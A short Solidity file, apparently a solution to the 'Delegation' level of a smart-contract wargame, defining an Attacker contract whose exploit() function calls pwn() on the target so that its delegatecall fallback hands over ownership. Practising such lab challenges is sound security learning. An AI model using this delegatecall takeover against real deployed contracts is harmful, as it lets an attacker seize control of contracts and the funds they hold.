// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "src/level06.sol";

contract Attacker
{
    Delegation level06 = Delegation(address(0x49e29Da739e4e2a60C244068CCA68d6f5004ec5b));
    constructor(address _level06)
    {
        level06 = Delegation(_level06);
    }
    address myOwner = msg.sender;

    function exploit() external
    {
        (bool success, ) = address(level06).call(abi.encodeWithSignature("pwn()"));
        require(success, "call not successful");
    }
}